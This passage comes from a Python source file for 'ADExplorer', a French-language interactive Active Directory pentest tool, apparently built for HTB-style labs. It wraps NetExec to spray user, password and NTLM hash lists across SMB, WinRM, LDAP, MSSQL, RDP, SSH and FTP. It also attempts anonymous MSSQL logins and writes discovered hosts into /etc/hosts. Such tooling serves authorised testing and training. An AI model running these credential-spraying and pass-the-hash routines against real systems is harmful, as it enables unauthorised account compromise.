                        logging.info("Liste de hashes pour multi_credentials définie.")
                    elif set_type == "hashesfile":
                        if os.path.isfile(value):
                            multi_credentials["hashes_file"] = value
                            multi_credentials["hashes"] = []
                            print(f"Fichier de hashes défini sur : {value}")
                            logging.info(f"Fichier de hashes '{value}' pour multi_credentials défini.")
                        else:
                            print(f"[-] Erreur: Fichier '{value}' introuvable.")
                    else:
                        print("Usage: set <user|password|domain|users|usersfile|passwords|passwordsfile|hashes|hashesfile> <valeur>")
                else:
                    print("Usage: set <type> <valeur>")
            
            elif command == "creds":
                print("[*] Identifiants uniques configurés :")
                print(f"  Utilisateur unique : {credentials['username'] if credentials['username'] else 'Non défini'}")
                print(f"  Mot de passe unique: {'********' if credentials['password'] else 'Non défini'}")
                
                print("\n[*] Identifiants multiples configurés pour 'testcreds':")
                print(f"  Domaine            : {multi_credentials['domain'] if multi_credentials['domain'] else 'Non défini'}")
                if multi_credentials["users_file"]:
                    print(f"  Fichier utilisateurs: {multi_credentials['users_file']}")
                else:
                    print(f"  Utilisateurs (liste): {', '.join(multi_credentials['users']) if multi_credentials['users'] else 'Non défini'}")
                
                if multi_credentials["passwords_file"]:
                    print(f"  Fichier mots de passe: {multi_credentials['passwords_file']}")
                else:
                    print(f"  Mots de passe (liste): {'Présents' if multi_credentials['passwords'] else 'Non défini'}")

                if multi_credentials["hashes_file"]:
                    print(f"  Fichier hashes     : {multi_credentials['hashes_file']}")
                else:
                    print(f"  Hashes (liste)     : {'Présents' if multi_credentials['hashes'] else 'Non défini'}")

            elif command == "clear" and len(command_parts) > 1 and command_parts[1] == "creds":
                credentials["username"] = None
                credentials["password"] = None
                credentials["domain"] = None
                multi_credentials["domain"] = None
                
                multi_credentials["users"] = []
                multi_credentials["passwords"] = []
                multi_credentials["hashes"] = []
                multi_credentials["users_file"] = None
                multi_credentials["passwords_file"] = None
                multi_credentials["hashes_file"] = None
                print("[*] Tous les identifiants (uniques et multiples) ont été effacés.")
                logging.info("Tous les identifiants effacés.")
            
            elif command == "testcreds":
                run_credential_tests(target_ip, scanned_ports, multi_credentials, session)
            elif command == "generatehosts":
                if not command_parts[1:]:
                    print("Usage: generatehosts <subnet_cidr> (ex: 10.10.10.0/24)")
                    continue
                subnet_to_scan = command_parts[1]
                # Valider le format du subnet CIDR (simpliste)
                if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}$", subnet_to_scan):
                    print(f"[-] Format de sous-réseau CIDR invalide: {subnet_to_scan}")
                    continue
                generate_and_append_etc_hosts(subnet_to_scan, AnsiColors.NO_COLOR_MODE)
            else:
                print(f"Commande inconnue: {command}. Tapez 'help' pour la liste des commandes.")

        except KeyboardInterrupt:
            logging.warning("Sortie demandée par l'utilisateur (Ctrl+C)")
            print("\nAu revoir ! (Ctrl+C détecté)")
            break
        except EOFError:
            logging.warning("Sortie demandée par l'utilisateur (Ctrl+D)")
            print("\nAu revoir ! (Ctrl+D détecté)")
            break
        except Exception as e:
            logging.error(f"Une erreur inattendue est survenue: {e}", exc_info=True)
            print(f"Erreur: {e}")

def load_items_from_file(filepath):
    """Charge une liste d'éléments depuis un fichier (un élément par ligne)."""
    if filepath and os.path.isfile(filepath):
        try:
            with open(filepath, 'r', encoding='utf-8') as f:
                return [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"[-] Erreur lors de la lecture du fichier {filepath}: {e}")
            logging.error(f"Erreur lecture fichier {filepath}: {e}")
    return []

def run_credential_tests(target_ip, scanned_services_ports, cred_config, session):
    """
    Exécute des tentatives d'authentification sur les services détectés
    en utilisant les listes d'utilisateurs, mots de passe et hashes fournies.
    """
    logging.info(f"Lancement des tests d'identifiants sur {target_ip}")
    print(f"\n[*] Lancement des tests d'identifiants sur {target_ip}...")

    users_to_test = cred_config["users"]
    if cred_config["users_file"]:
        users_to_test.extend(load_items_from_file(cred_config["users_file"]))
    
    passwords_to_test = cred_config["passwords"]
    if cred_config["passwords_file"]:
        passwords_to_test.extend(load_items_from_file(cred_config["passwords_file"]))

    hashes_to_test = cred_config["hashes"]
    if cred_config["hashes_file"]:
        hashes_to_test.extend(load_items_from_file(cred_config["hashes_file"]))

    domain = cred_config["domain"]

    if not users_to_test:
        print("[-] Aucune liste d'utilisateurs à tester. Configurez avec 'set users' ou 'set usersfile'.")
        return
    if not passwords_to_test and not hashes_to_test:
        print("[-] Aucune liste de mots de passe ou de hashes à tester. Configurez avec 'set passwords/hashes' ou 'set passwordsfile/hashesfile'.")
        return

    successful_logins = []

    protocols_to_test_map = {
        "SMB": "smb",
        "WinRM_HTTP": "winrm",
        "WinRM_HTTPS": "winrm",
        "LDAP": "ldap",
        "LDAPS": "ldap",
        "MSSQL": "mssql",
        "RDP": "rdp",
        "SSH": "ssh",
        "FTP": "ftp",
    }

    for service_name, ports in scanned_services_ports.items():
        if not ports:
            continue
        
        nxc_protocol = protocols_to_test_map.get(service_name)
        if not nxc_protocol:
            logging.info(f"Pas de mapping nxc pour le service '{service_name}', ignoré pour testcreds.")
            continue

        print(f"\n--- Test du service: {service_name} (Protocole nxc: {nxc_protocol}) sur les ports {ports} ---")

        for user in set(users_to_test):
            if not user: continue

            for password in set(passwords_to_test):
                if not password: continue
                
                print(f"  [>] Test: {user} / {password[:2]}** (domaine: {domain if domain else 'local'}) sur {service_name}")
                cmd = [NXC_CMD, nxc_protocol, target_ip, "-u", user, "-p", password]
                if domain:
                    cmd.extend(["-d", domain])
                if nxc_protocol == "ldap" and (636 in ports or 3269 in ports):
                    cmd.append("--ssl")
                
                if nxc_protocol == "smb": cmd.append("--shares")

                output, ret_code = run_command(cmd, capture_output=True)

                if output and "(Pwn3d!)" in output:
                    success_detail = f"Service: {service_name}, User: {user}, Pass: {password}"
                    print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Pwn3d!): {success_detail}{AnsiColors.ENDC}")
                    successful_logins.append(success_detail)
                elif ret_code == 0 and output and not any(err_msg in output.lower() for err_msg in ["logon failure", "authentication failed", "access denied"]):
                    if nxc_protocol == "smb" and "READ" in output or "WRITE" in output:
                         success_detail = f"Service: {service_name}, User: {user}, Pass: {password} (Accès confirmé)"
                         print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Accès confirmé): {success_detail}{AnsiColors.ENDC}")
                         successful_logins.append(success_detail)

            for ntlm_hash in set(hashes_to_test):
                if not ntlm_hash: continue

                print(f"  [>] Test: {user} / Hash: {ntlm_hash[:10]}... (domaine: {domain if domain else 'local'}) sur {service_name}")
                cmd = [NXC_CMD, nxc_protocol, target_ip, "-u", user, "-H", ntlm_hash]
                if domain:
                    cmd.extend(["-d", domain])
                if nxc_protocol == "ldap" and (636 in ports or 3269 in ports):
                    cmd.append("--ssl")
                if nxc_protocol == "smb": cmd.append("--shares")

                output, ret_code = run_command(cmd, capture_output=True)

                if output and "(Pwn3d!)" in output:
                    success_detail = f"Service: {service_name}, User: {user}, Hash: {ntlm_hash}"
                    print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Pwn3d! avec Hash): {success_detail}{AnsiColors.ENDC}")
                    successful_logins.append(success_detail)
                elif ret_code == 0 and output and not any(err_msg in output.lower() for err_msg in ["logon failure", "authentication failed", "access denied"]):
                    if nxc_protocol == "smb" and "READ" in output or "WRITE" in output:
                         success_detail = f"Service: {service_name}, User: {user}, Hash: {ntlm_hash} (Accès confirmé)"
                         print(f"    {AnsiColors.GREEN}[+] SUCCÈS (Accès confirmé avec Hash): {success_detail}{AnsiColors.ENDC}")
                         successful_logins.append(success_detail)


    if successful_logins:
        print("\n--- [!] Identifiants valides trouvés ---")
        for login in set(successful_logins):
            print(f"  {AnsiColors.GREEN}{login}{AnsiColors.ENDC}")
    else:
        print("\n--- [-] Aucun identifiant valide trouvé lors des tests. ---")

    logging.info(f"Tests d'identifiants terminés. Succès: {len(set(successful_logins))}")

def generate_and_append_etc_hosts(subnet_cidr, no_color_mode=False):
    """Découvre les hôtes sur un sous-réseau et propose d'ajouter les entrées à /etc/hosts."""
    if not NXC_AVAILABLE:
        print(f"{AnsiColors.RED}[-] NetExec (nxc) n'est pas disponible. Impossible de découvrir les hôtes.{AnsiColors.ENDC}")
        return

    print(f"[*] Découverte des hôtes actifs et de leurs noms sur {subnet_cidr} avec 'nxc smb'...")
    # Utiliser nxc smb <subnet> pour la découverte.
    # La sortie ressemble à:
    # SMB         10.10.11.41     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certified.htb) (signing:True) (SMBv1:False)
    # SMB         10.10.11.35     445    CICADA-DC        [*] Windows Server 2022 Build 20348 x64 (name:CICADA-DC) (domain:cicada.htb) (signing:True) (SMBv1:False)
    
    cmd_discover = [NXC_CMD, "smb", subnet_cidr]
    # Nous avons besoin de capturer la sortie pour la parser.
    # La fonction run_command actuelle affiche en temps réel ET retourne la sortie.
    raw_output, ret_code = run_command(cmd_discover, capture_output=True)

    if ret_code != 0 and not raw_output: # Si nxc échoue et ne donne aucune sortie
        print(f"{AnsiColors.RED}[-] Échec de la commande de découverte d'hôtes nxc.{AnsiColors.ENDC}")
        return
    
    if not raw_output:
        print(f"[-] Aucune sortie de la commande de découverte nxc pour {subnet_cidr}.")
        return

    host_entries_data = [] # Va stocker des tuples (ip, hostname, domain)

    # Regex pour parser la ligne SMB de nxc
    # Captures: IP, Nom d'hôte (NetBIOS), Nom d'hôte (détail), Domaine (détail)
    # L'IP est la 2ème colonne, le nom d'hôte est la 4ème. Le domaine est dans les détails.
    # Regex plus robuste pour la ligne SMB:
    # SMB\s+([\d\.]+)\s+\d+\s+([^\s]+)\s+\[\*\](?:.*\(name:([^\)]+)\))?(?:.*\(domain:([^\)]+)\))?
    # Groupe 1: IP
    # Groupe 2: Nom d'hôte (colonne 4)
    # Groupe 3: Nom d'hôte détaillé (optionnel)
    # Groupe 4: Domaine détaillé (optionnel)

    # Simplifions en se basant sur la structure des colonnes et le parsing des détails pour le domaine.
    # La 4ème colonne est le nom d'hôte (ex: DC01).
    # Le domaine est dans (domain:NOM_DOMAINE)
    
    parsed_ips = set() # Pour éviter les doublons si nxc liste plusieurs fois

    for line in raw_output.splitlines():
        line = line.strip()
        if line.startswith("SMB"):
            parts = re.split(r'\s+', line, maxsplit=4) # Divise sur les espaces, max 4 fois pour garder la fin
            if len(parts) >= 4:
                ip_address = parts[1]
                hostname_short = parts[3] # Nom d'hôte de la 4ème colonne
                
                if ip_address in parsed_ips:
                    continue
                parsed_ips.add(ip_address)

                domain_name = None
                details_part = parts[4] if len(parts) > 4 else ""

                domain_match = re.search(r"\(domain:([^\)]+)\)", details_part, re.IGNORECASE)
                if domain_match:
                    domain_name = domain_match.group(1)
                
                # Si le nom d'hôte de la 4ème colonne contient déjà le domaine, on l'utilise
                if domain_name and hostname_short.lower().endswith("." + domain_name.lower()):
                    fqdn = hostname_short
                    hostname_short = fqdn.split('.')[0] # Recalculer le nom court
                elif domain_name:
                    fqdn = f"{hostname_short}.{domain_name}"
                else:
                    fqdn = hostname_short # Pas de domaine trouvé, on utilise le nom court comme FQDN
                                        # On pourrait tenter une résolution inversée ici en fallback

                host_entries_data.append({'ip': ip_address, 'fqdn': fqdn, 'shortname': hostname_short})
                print(f"  [+] Détecté: IP={ip_address}, FQDN={fqdn}, Shortname={hostname_short}")

    if not host_entries_data:
        print(f"[-] Aucun hôte SMB valide trouvé ou parsé sur {subnet_cidr}.")
        return
    
    etc_hosts_entries = []
    for data in host_entries_data:
        # Format: IP FQDN SHORTNAME
        # Si FQDN et SHORTNAME sont identiques (pas de domaine), on met juste IP FQDN
        if data['fqdn'].lower() == data['shortname'].lower():
            etc_hosts_entries.append(f"{data['ip']}\t{data['fqdn']}")
        else:
            etc_hosts_entries.append(f"{data['ip']}\t{data['fqdn']}\t{data['shortname']}")

    if not etc_hosts_entries:
        print("[-] Aucune entrée /etc/hosts à générer après parsing.")
        return

    print("\n--- Entrées /etc/hosts proposées ---")
    header_comment = f"\n# Added by ADExplorer - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - Subnet: {subnet_cidr}\n"
    print(header_comment.strip())
    for entry in etc_hosts_entries:
        print(entry)
    print("# End of ADExplorer entries\n")

    try:
        confirm = session.prompt(f"Voulez-vous ajouter ces entrées à /etc/hosts? ({AnsiColors.YELLOW}y{AnsiColors.ENDC}/{AnsiColors.YELLOW}N{AnsiColors.ENDC}): ", default="n").lower()
    except (KeyboardInterrupt, EOFError):
        print("\n[!] Annulation.")
        return
        
    if confirm == 'y':
        if os.geteuid() != 0:
            print(f"{AnsiColors.RED}[!] Vous devez exécuter ce script avec sudo ou en tant que root pour modifier /etc/hosts.{AnsiColors.ENDC}")
            print(f"[*] Veuillez ajouter manuellement les entrées ci-dessus si vous le souhaitez.")
            return

        try:
            with open("/etc/hosts", "a") as f:
                f.write(header_comment)
                for entry in etc_hosts_entries:
                    f.write(entry + "\n")
                f.write("# End of ADExplorer entries\n")
            print(f"{AnsiColors.GREEN}[+] Entrées ajoutées avec succès à /etc/hosts.{AnsiColors.ENDC}")
        except PermissionError:
            print(f"{AnsiColors.RED}[!] Erreur de permission. Assurez-vous d'avoir les droits pour écrire dans /etc/hosts.{AnsiColors.ENDC}")
        except Exception as e:
            print(f"{AnsiColors.RED}[-] Une erreur est survenue lors de l'écriture dans /etc/hosts: {e}{AnsiColors.ENDC}")
    else:
        print("[*] Les entrées n'ont pas été ajoutées à /etc/hosts.")

def explore_mssql(target_ip, mssql_ports, session):
    """Menu interactif pour explorer les services MSSQL."""
    if not NXC_AVAILABLE:
        print(f"{AnsiColors.RED}[-] NetExec (nxc) n'est pas disponible. Impossible d'explorer MSSQL.{AnsiColors.ENDC}")
        return

    if not mssql_ports:
        print(f"[-] Aucun port MSSQL spécifié pour {target_ip}.")
        return
        
    print(f"\n--- Exploration MSSQL sur {target_ip} (Ports: {', '.join(map(str, mssql_ports))}) ---")
    
    mssql_commands_help = {
        "check_public": "Vérifier si le serveur MSSQL est listé comme 'public' (nécessite nxc avec module mssql).",
        "enum_version": "Tenter d'énumérer la version de MSSQL (souvent via une connexion anonyme ou par défaut).",
        "test_login <user> <password> [domain]": "Tester des identifiants spécifiques.",
        "test_current_creds": "Tester les identifiants actuellement configurés (set user/pass/domain).",
        "run_all_checks": "Exécuter toutes les vérifications de base (public, version).",
        "help": "Afficher ce menu d'aide.",
        "back": "Retourner au menu principal de la cible."
    }
    mssql_completer = WordCompleter(list(mssql_commands_help.keys()), ignore_case=True)

    while True:
        try:
            full_command = session.prompt(
                f"ADExplorer ({AnsiColors.YELLOW}{target_ip}{AnsiColors.ENDC}) ({AnsiColors.CYAN}MSSQL{AnsiColors.ENDC})> ",
                completer=mssql_completer,
                auto_suggest=AutoSuggestFromHistory(),
                style=cli_style
            ).strip()
            if not full_command:
                continue
            
            parts = full_command.split()
            command = parts[0].lower()
            args = parts[1:]

            logging.info(f"Commande MSSQL reçue pour {target_ip}: {full_command}")

            if command == "help":
                print_target_menu({"Commandes MSSQL": mssql_commands_help})
            elif command == "back":
                break
            elif command == "exit": # Permettre exit depuis ce sous-menu aussi
                logging.info("Demande de sortie de l'application.")
                print("Au revoir !")
                sys.exit(0)
            elif command == "check_public":
                # nxc mssql <target> --is-public (si cette option existe)
                # ou nxc mssql <target> (et regarder la sortie pour des indicateurs)
                print("[*] Vérification du statut 'public' (nécessite une interprétation manuelle de la sortie de nxc)...")
                for port in mssql_ports:
                    cmd = [NXC_CMD, "mssql", f"{target_ip}:{port}"]
                    output, _ = run_command(cmd)
                    if output:
                        print(f"--- Sortie pour {target_ip}:{port} ---")
                        print(output)
            elif command == "enum_version":
                print("[*] Tentative d'énumération de la version MSSQL...")
                for port in mssql_ports:
                    # nxc mssql <target> -u '' -p '' (pourrait donner la version)
                    # ou nxc mssql <target> --info (si disponible)
                    cmd = [NXC_CMD, "mssql", f"{target_ip}:{port}", "-u", "", "-p", ""] # Tentative anonyme
                    output, _ = run_command(cmd)
                    if output:
                        print(f"--- Sortie pour {target_ip}:{port} (tentative anonyme) ---")
                        print(output)
                        # Rechercher des motifs de version
                        version_match = re.search(r"Microsoft SQL Server\s*(\d{4}|\d{2}\.\d{1,2}\.\d{4}\.\d{2})", output, re.IGNORECASE)
                        if version_match:
                            print(f"{AnsiColors.GREEN}[+] Version MSSQL potentielle trouvée: {version_match.group(0)}{AnsiColors.ENDC}")
            elif command == "test_login":
                if len(args) < 2:
                    print("Usage: test_login <user> <password> [domain]")
                    continue
                user, password = args[0], args[1]
                domain = args[2] if len(args) > 2 else credentials.get("domain") or multi_credentials.get("domain")
                
                print(f"[*] Test des identifiants MSSQL: {domain}\\{user} (pass: ****) sur {target_ip}")
                for port in mssql_ports:
                    cmd = [NXC_CMD, "mssql", f"{target_ip}:{port}", "-u", user, "-p", password]
                    if domain:
                        cmd.extend(["-d", domain])
                    output, _ = run_command(cmd)
                    if output:
                        print(f"--- Sortie pour {target_ip}:{port} ---")
                        print(output)
                        if "(Pwn3d!)" in output or "Authentication successful" in output: # Adapter selon la sortie de nxc
                            print(f"{AnsiColors.GREEN}[+] Identifiants valides pour {domain}\\{user} sur {target_ip}:{port}!{AnsiColors.ENDC}")
            elif command == "test_current_creds":
                user = credentials.get("username")
                password = credentials.get("password")
                domain = credentials.get("domain") or multi_credentials.get("domain") # Prioriser le domaine de multi_creds s'il est là
                if not user or not password:
                    print("[-] Aucun identifiant (utilisateur/mot de passe) configuré avec 'set user/password'.")
                    continue
                
                print(f"[*] Test des identifiants MSSQL configurés: {domain}\\{user} (pass: ****) sur {target_ip}")
                for port in mssql_ports:
                    cmd = [NXC_CMD, "mssql", f"{target_ip}:{port}", "-u", user, "-p", password]
                    if domain:
                        cmd.extend(["-d", domain])
                    output, _ = run_command(cmd)
                    if output:
                        print(f"--- Sortie pour {target_ip}:{port} ---")
                        print(output)
                        if "(Pwn3d!)" in output or "Authentication successful" in output:
                            print(f"{AnsiColors.GREEN}[+] Identifiants configurés valides pour {domain}\\{user} sur {target_ip}:{port}!{AnsiColors.ENDC}")
            elif command == "run_all_checks":
                print_target_menu({"Commandes MSSQL": mssql_commands_help}) # Afficher l'aide d'abord
                session.prompt(f"Exécution de 'check_public' et 'enum_version'. Appuyez sur Entrée pour continuer...", style=cli_style)
                # Simuler l'appel des commandes
                print("\n--- Exécution de check_public ---")
                # Code de check_public (simplifié ici, en réalité appeler la logique)
                for port_s in mssql_ports:
                    cmd_s = [NXC_CMD, "mssql", f"{target_ip}:{port_s}"]
                    output_s, _ = run_command(cmd_s)
                    if output_s: print(output_s)

                print("\n--- Exécution de enum_version ---")
                # Code de enum_version (simplifié)
                for port_s in mssql_ports:
                    cmd_s = [NXC_CMD, "mssql", f"{target_ip}:{port_s}", "-u", "", "-p", ""]
                    output_s, _ = run_command(cmd_s)
                    if output_s: print(output_s)
            else:
                print(f"Commande MSSQL inconnue: {command}")

        except KeyboardInterrupt:
            print("\n[!] Interruption MSSQL. Retour au menu principal de la cible.")
            break
        except EOFError:
            print("\n[!] EOF reçu. Retour au menu principal de la cible.")
            break
        except Exception as e:
            logging.error(f"Erreur inattendue dans le menu MSSQL: {e}")
            print(f"{AnsiColors.RED}Erreur: {e}{AnsiColors.ENDC}")


# --- Point d'entrée principal ---
if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="AD Explorer - Outil interactif d'exploration Active Directory.",
        formatter_class=argparse.RawTextHelpFormatter, # Pour mieux afficher l'epilog
        epilog="""Exemple: python ad_explorer.py 192.168.1.100

Dépendances externes requises (doivent être dans le PATH):
  - netexec (nxc)
  - rpcclient
"""
    )
    parser.add_argument("target_ip", help="Adresse IP de la cible (ex: contrôleur de domaine).")
    parser.add_argument("--no-color", action="store_true", help="Désactiver la sortie colorée pour les messages non-prompt_toolkit.")
    
    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)
        
    args = parser.parse_args()

    if args.no_color:
        AnsiColors.NO_COLOR_MODE = True

    try:
        ipaddress.ip_address(args.target_ip) # Valide l'adresse IP
    except ValueError:
        logging.error(f"Adresse IP invalide fournie: {args.target_ip}")
        print(f"Erreur: L'adresse IP '{args.target_ip}' n'est pas valide.")
        sys.exit(1)

    logging.info(f"AD Explorer démarré. Cible: {args.target_ip}")

    NXC_AVAILABLE = check_command_exists("nxc") or check_command_exists("netexec")
    RPCCLIENT_AVAILABLE = check_command_exists("rpcclient")
    KERBRUTE_AVAILABLE = check_command_exists("kerbrute")
    IMPACKET_EXAMPLES_AVAILABLE = check_command_exists("samrdump.py") # Juste un exemple
    
    if not NXC_AVAILABLE or not RPCCLIENT_AVAILABLE:
        print("[!] Certaines fonctionnalités seront limitées car des outils externes sont manquants.")

    open_services_found = initial_scan(args.target_ip)
    
    if not open_services_found and not any(port_info[0] for port_info in SERVICE_PORTS.values()):
        logging.warning(f"Aucun service pertinent détecté sur {args.target_ip}. L'outil interactif pourrait avoir des fonctionnalités limitées.")

    session = PromptSession(history=FileHistory('.ad_explorer_target_history'), style=cli_style)

    main_loop(args.target_ip, open_services_found, session)

    logging.info("AD Explorer terminé.") 
